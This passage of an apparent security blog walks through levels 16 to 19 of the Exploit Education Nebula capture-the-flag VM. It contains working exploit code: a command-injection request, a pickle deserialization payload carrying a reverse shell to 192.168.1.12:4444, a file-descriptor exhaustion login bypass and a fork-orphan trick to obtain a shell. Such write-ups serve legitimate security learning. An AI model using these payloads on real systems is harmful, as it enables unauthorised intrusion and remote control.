  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">sub </span><span class="nf">htmlz</span> <span class="p">{</span>
  <span class="k">print</span><span class="p">("</span><span class="s2">&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;</span><span class="p">");</span>
  <span class="k">if</span><span class="p">(</span><span class="vg">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">print</span><span class="p">("</span><span class="s2">Your login was accepted&lt;br/&gt;</span><span class="p">");</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="k">print</span><span class="p">("</span><span class="s2">Your login failed&lt;br/&gt;</span><span class="p">");</span>
  <span class="p">}</span>    
  <span class="k">print</span><span class="p">("</span><span class="s2">Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;</span><span class="se">\n</span><span class="p">");</span>
<span class="p">}</span>

<span class="nv">htmlz</span><span class="p">(</span><span class="nv">login</span><span class="p">(</span><span class="nv">param</span><span class="p">("</span><span class="s2">username</span><span class="p">"),</span> <span class="nv">param</span><span class="p">("</span><span class="s2">password</span><span class="p">")));</span>
</code></pre></div></div>
<p>Looking at the above script, the following line is vulnerable to command/argument injection.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@output = `egrep "^$username" /home/flag16/userdb.txt 2&gt;&amp;1`;
</code></pre></div></div>

<p>However, the above script will turn the user provided username to uppercase and will strip everything after a space (line11 and line12). An easy way to bypass this is to use backticks with the following payload where exploit is a bash script: <code class="language-plaintext highlighter-rouge">/*/EXPLOIT.SH</code>.</p>

<p>Within the bash script, the following payload can be inserted.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level16@nebula:~$ cat /tmp/EXPLOIT.SH 
#!/bin/bash
getflag &gt; /tmp/flag
</code></pre></div></div>

<p>This is needed because it is not possible to inject directly into the script and view results directly.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level16@nebula:~$ vi /tmp/EXPLOIT
level16@nebula:~$ nc 127.0.0.1 1616
GET /index.cgi?username=%24%28%2F%2A%2FEXPLOIT.SH%29&amp;password=
Content-type: text/html
</code></pre></div></div>

<p>This can then be run to execute the <code class="language-plaintext highlighter-rouge">getflag</code> command as the flag16 user.</p>

<p><img src="/assets/exploiteducation/level16.png" alt="alt text" title="level16" /></p>

<h2 id="level-17">Level 17</h2>

<p>Level 17 states that a python script is running on port 10007 that contains a vulnerability. The source code of this program is shown below:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/python

import os
import pickle
import time
import socket
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
  line = skt.recv(1024)

  obj = pickle.loads(line)

  for i in obj:
      clnt.send("why did you send me " + i + "?\n")

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind(('0.0.0.0', 10007))
skt.listen(10)

while True:
  clnt, addr = skt.accept()

  if(os.fork() == 0):
      clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
      server(clnt)
      exit(1)

</code></pre></div></div>

<p>The above program takes data via a network socket, uses pickle (serialization) and then prints the data back. The pickle module within is not secure against data provided by user input and can result in deserialization attacks.</p>

<p>The following attacker script can be used to take a command such as <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/192.168.1.12/4444 0&gt;&amp;1</code> which when executed will run bash, open a network socket and will bind bash and connect back to an attacker controlled IP address.</p>

<p>This is the serialized using pickle and this data is then written to a file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
import sys
import base64
import os

COMMAND = "bash -i &gt;&amp; /dev/tcp/192.168.1.12/4444 0&gt;&amp;1"

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))


os.system("touch exploit")
with open('exploit', "wb") as exploit:
    pickle.dump(PickleRce(),exploit, pickle.HIGHEST_PROTOCOL)     
</code></pre></div></div>

<p>This data can now be sent to the python script.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snoopy@snoopy-XPS-15-9570:~$ cat exploit 
ÔøΩcposix
system
qU*bash -i &gt;&amp; /dev/tcp/192.168.1.12/4444 0&gt;&amp;1qÔøΩqRq.snoopy@snoopy-XPS-15-9570:~$ cat exploit | nc -nv 192.168.1.24 10007
Connection to 192.168.1.24 10007 port [tcp/*] succeeded!
Accepted connection from 192.168.1.12:33428
</code></pre></div></div>

<p>This will then connect back to a netcat listener listening on port 4444.</p>

<p><img src="/assets/exploiteducation/level17.png" alt="alt text" title="level17" /></p>

<h2 id="level-18">Level 18</h2>

<p>Level 18 provides the source code for the following C program. It is also stated that there are multiple ways to complete this challenge.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;getopt.h&gt;

struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;

#define dprintf(...) if(globals.debugfile) \
  fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile &amp;&amp; globals.verbose &gt;= num) \
  fprintf(globals.debugfile, __VA_ARGS__)

#define PWFILE "/home/flag18/password"

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, "r");
  if(fp) {
      char file[64];

      if(fgets(file, sizeof(file) - 1, fp) == NULL) {
          dprintf("Unable to read password file %s\n", PWFILE);
          return;
      }
                fclose(fp);
      if(strcmp(pw, file) != 0) return;       
  }
  dprintf("logged in successfully (with%s password file)\n",
      fp == NULL ? "out" : "");
  
  globals.loggedin = 1;

}

void notsupported(char *what)
{
  char *buffer = NULL;
  asprintf(&amp;buffer, "--&gt; [%s] is unsupported at this current time.\n", what);
  dprintf(what);
  free(buffer);
}

void setuser(char *user)
{
  char msg[128];

  sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);
  printf("%s\n", msg);

}

int main(int argc, char **argv, char **envp)
{
  char c;

  while((c = getopt(argc, argv, "d:v")) != -1) {
      switch(c) {
          case 'd':
              globals.debugfile = fopen(optarg, "w+");
              if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg);
              setvbuf(globals.debugfile, NULL, _IONBF, 0);
              break;
          case 'v':
              globals.verbose++;
              break;
      }
  }

  dprintf("Starting up. Verbose level = %d\n", globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());
  
  while(1) {
      char line[256];
      char *p, *q;

      q = fgets(line, sizeof(line)-1, stdin);
      if(q == NULL) break;
      p = strchr(line, '\n'); if(p) *p = 0;
      p = strchr(line, '\r'); if(p) *p = 0;

      dvprintf(2, "got [%s] as input\n", line);

      if(strncmp(line, "login", 5) == 0) {
          dvprintf(3, "attempting to login\n");
          login(line + 6);
      } else if(strncmp(line, "logout", 6) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, "shell", 5) == 0) {
          dvprintf(3, "attempting to start shell\n");
          if(globals.loggedin) {
              execve("/bin/sh", argv, envp);
              err(1, "unable to execve");
          }
          dprintf("Permission denied\n");
      } else if(strncmp(line, "logout", 4) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, "closelog", 8) == 0) {
          if(globals.debugfile) fclose(globals.debugfile);
          globals.debugfile = NULL;
      } else if(strncmp(line, "site exec", 9) == 0) {
          notsupported(line + 10);
      } else if(strncmp(line, "setuser", 7) == 0) {
          setuser(line + 8);
      }
  }

  return 0;
}

</code></pre></div></div>

<p>Looking at the main function, the program looks for <code class="language-plaintext highlighter-rouge">-d</code> file which enables logging to the provided log file and <code class="language-plaintext highlighter-rouge">-v</code>` to increase the verbosity level.</p>

<p>One interesting thing to note right away is the following code block which opens the <code class="language-plaintext highlighter-rouge">/home/flag18/password</code> file and compares the input against the contents of that file.</p>

<p>A problem here arises because <code class="language-plaintext highlighter-rouge">global.loggedin = 1</code> is outside of the <code class="language-plaintext highlighter-rouge">if(fp)</code> block. As such, if an <code class="language-plaintext highlighter-rouge">fopen()</code> call returns NULL, it is possible to skip the if conditional block and be <code class="language-plaintext highlighter-rouge">loggedin</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
#define PWFILE "/home/flag18/password"

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, "r");
  if(fp) {
      char file[64];

      if(fgets(file, sizeof(file) - 1, fp) == NULL) {
          dprintf("Unable to read password file %s\n", PWFILE);
          return;
      }
                fclose(fp);
      if(strcmp(pw, file) != 0) return;       
  }
  dprintf("logged in successfully (with%s password file)\n",
      fp == NULL ? "out" : "");
  
  globals.loggedin = 1;

}
</code></pre></div></div>
<p>One way to get the <code class="language-plaintext highlighter-rouge">fopen()</code> call to return NULL is by exhausting the system‚Äôs available file descriptors. For each Linux system, there are limits defined for the maximum amount of files that can be opened. THe below command shows the amount of descriptors presently allocated and the maximum descriptors that can be used.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level18@nebula:~$ sysctl fs.file-nr
fs.file-nr = 352	0	100898
</code></pre></div></div>
<p>Looking at the above output, 320 out of 100898 file descriptors are currently being used.</p>

<p>However, there are some limits defined for how many files can be opened per process; <code class="language-plaintext highlighter-rouge">ulimit -a</code> command can be used to get this information. The <code class="language-plaintext highlighter-rouge">H</code> option within ulimit can be used to get Hard limits. This requires root privileges to modify. The <code class="language-plaintext highlighter-rouge">S</code> option within ulimit can be used to get Soft limits. This option can be modified by the current user:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level18@nebula:~$ ulimit -Sa |grep files
open files                      (-n) 1024
level18@nebula:~$ ulimit -Ha |grep files
open files                      (-n) 4096
level18@nebula:~$ 
</code></pre></div></div>

<p>By knowing that 1024 is the open file limit, one way to solve this challenge is to exhaust the  filedescriptors up all system file handlers and then call the flag18 program‚Äôs login command that will fail opening the password file and will set the loggedin flag to 1. 3 descriptors should also be spared for stdin, stdout and stderr so it is possible to run <code class="language-plaintext highlighter-rouge">getflag</code> after running the program.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level18@nebula:/tmp$ python -c 'print("login foo\n"*1021)' &gt; /home/level18/foo
level18@nebula:/tmp$ python -c 'print("closelog")' &gt;&gt; /home/level18/foo
level18@nebula:/tmp$  python -c 'print("shell")' &gt;&gt; /home/level18/foo
level18@nebula:/tmp$ cat /home/level18/foo | /home/flag18/flag18 -d /dev/tty
Starting up. Verbose level = 0
logged in successfully (without password file)
</code></pre></div></div>
<p>The above python script tries to login 1021 times, closes the connection and gets a system shell. This can then be used to run the flag program and a /dev/tty
can be specified to get a shell.</p>

<p><img src="/assets/exploiteducation/level18-1.png" alt="alt text" title="level18" /></p>

<p>In the above command, anything specified after the <code class="language-plaintext highlighter-rouge">-d</code> parameter and anything following it to be ignored. We can achieve this by passing either <code class="language-plaintext highlighter-rouge">--init-file</code> or <code class="language-plaintext highlighter-rouge">--rcfile</code> as our first argument to flag18. The <code class="language-plaintext highlighter-rouge">-d</code> parameter will then be ignored by bash.</p>

<h2 id="level-19">Level 19</h2>

<p>Level 19 provides the following source and mentions that there is a flaw in the below program in how it operates.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/stat.h&gt;

int main(int argc, char **argv, char **envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;

  /* Get the parent's /proc entry, so we can verify its user id */

  snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid());

  /* stat() it */

  if(stat(buf, &amp;statbuf) == -1) {
      printf("Unable to check parent process\n");
      exit(EXIT_FAILURE);
  }

  /* check the owner id */

  if(statbuf.st_uid == 0) {
      /* If root started us, it is ok to start the shell */

      execve("/bin/sh", argv, envp);
      err(1, "Unable to execve");
  }

  printf("You are unauthorized to run this program\n");
}
</code></pre></div></div>
<p>By looking at the above program, it executes a shell if the parent process was started by root. Within the program itself, <code class="language-plaintext highlighter-rouge">getppid</code> is used to achieve this. <code class="language-plaintext highlighter-rouge">getppid</code> returns the pid of the parent of the calling process is what defines whether a shell should be given or not. <code class="language-plaintext highlighter-rouge">getppid</code> returns the PID of init e.g. 1 and <code class="language-plaintext highlighter-rouge">/proc/1</code> is owned by root. The way to solve this challenge is to kill the parent process which called the flag19 program before the program calls <code class="language-plaintext highlighter-rouge">getppid</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;unistd.h&gt;

int main(int argc, char **argv, char **envp) {
    int childPID = fork();
    if(childPID &gt;= 0) { // forked
        if(childPID == 0) { // child
            sleep(1);
            setresuid(geteuid(),geteuid(),geteuid());
            char *args[] = {"/bin/sh", "-c", "/bin/getflag", NULL};
            execve("/home/flag19/flag19", args, envp);
        }
    }
    return 0;
}
</code></pre></div></div>
<p>The above program creates a process using <code class="language-plaintext highlighter-rouge">fork</code>. Fork system call is used for creating a new process, which is called child process, which runs concurrently with the process that makes the fork() call (parent process). After a new child process is created, both processes will execute the next instruction following the fork() system call. sleep is then used to force create an orphan process that would be claimed by init, which is owned by root. Then the <code class="language-plaintext highlighter-rouge">exec</code> call is done to run the flag19 program which is execute the getflag command.</p>

<p><img src="/assets/exploiteducation/level19.png" alt="alt text" title="level19" /></p>

<p>This brings to the end Exploit Exercises Nebula. Overall, the challenges were great fun and difficulty increased throughout and required me to look at multiple writeups online to complete this.</p>

</article>





<section class="rss">
  <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
</section>

<section class="share">
  <span>Share: </span>
  
    
    
      <a href="//twitter.com/share?text=Exploit+Education+-+Nebula+Walkthrough&url=http%3A%2F%2Flocalhost%3A4000%2Fcapture-the-flag%2F2019%2F09%2F17%2F10_Exploit_Education_Nebula_Walkthrough.html&via=snoopysecurity"
        onclick="window.open(this.href, 'twitter-share', 'width=550,height=255');return false;">
        <i class="fa fa-twitter-square fa-lg"></i>
      </a>
    
    
    
    
    
    
    
  
    
    
    
      <a href="//www.facebook.com/sharer.php?t=Exploit+Education+-+Nebula+Walkthrough&u=http%3A%2F%2Flocalhost%3A4000%2Fcapture-the-flag%2F2019%2F09%2F17%2F10_Exploit_Education_Nebula_Walkthrough.html"
        onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
        <i class="fa fa-facebook-square fa-lg"></i>
      </a>
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
      <a href="//www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fcapture-the-flag%2F2019%2F09%2F17%2F10_Exploit_Education_Nebula_Walkthrough.html"
        onclick="window.open(this.href, 'linkedin-share', 'width=550,height=255');return false;">
        <i class="fa fa-linkedin-square fa-lg"></i>
      </a>
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
      <a href="//www.pinterest.com/pin/create/button/?description=Exploit+Education+-+Nebula+Walkthrough&url=http%3A%2F%2Flocalhost%3A4000%2Fcapture-the-flag%2F2019%2F09%2F17%2F10_Exploit_Education_Nebula_Walkthrough.html&media=http://localhost:4000/assets/exploiteducation/cover2.jpeg"
        onclick="window.open(this.href, 'pinterest-share', 'width=550,height=255');return false;">
        <i class="fa fa-pinterest-square fa-lg"></i>
      </a>
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
</section>




</div>
</div>

    </div>

    <footer class="site-footer">

  <div class="wrapper">

    <h3 class="footer-heading">üíª | Blog</h3>

    <div class="site-navigation">

      <p><strong>Site Map</strong></p>
      <ul class="pages">
        
        
          <li class="nav-link"><a href="/about/">About</a>
        
        
        
        
        
        
        
        
        
          <li class="nav-link"><a href="/posts/">Posts</a>
        
        
        
        
        
        
        
        
        
        
        
        
      </ul>
    </div>

    <div class="site-contact">

      <p><strong>Contact</strong></p>
      <ul class="social-media-list">
        <li>
          <a href="mailto:na">
            <i class="fa fa-envelope-o"></i>
            <span class="username">na</span>
          </a>
        </li>

        
          
          <li>
            <a href="https://twitter.com/snoopysecurity" title="Follow me on Twitter">
              <i class="fa fa-twitter"></i>
              <span class="username">snoopysecurity</span>
            </a>
          </li>
          
        
          
        
          
          <li>
            <a href="https://github.com/snoopysecurity" title="Fork me on GitHub">
              <i class="fa fa-github"></i>
              <span class="username">snoopysecurity</span>
            </a>
          </li>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        

      </ul>
    </div>

    <div class="site-signature">
      <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
      <p class="text">Hacking to learn, while learning to hack.
</p>
    </div>

  </div>

</footer>

<!-- Scripts -->
<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/js/lightbox.min.js"></script>

<script type="text/javascript">
$(document).ready(function() {
  // Default syntax highlighting
  hljs.initHighlightingOnLoad();

  // Header
  var menuToggle = $('#js-mobile-menu').unbind();
  $('#js-navigation-menu').removeClass("show");
  menuToggle.on('click', function(e) {
    e.preventDefault();
    $('#js-navigation-menu').slideToggle(function(){
      if($('#js-navigation-menu').is(':hidden')) {
        $('#js-navigation-menu').removeAttr('style');
      }
    });
  });
});

</script>






  </body>

</html>
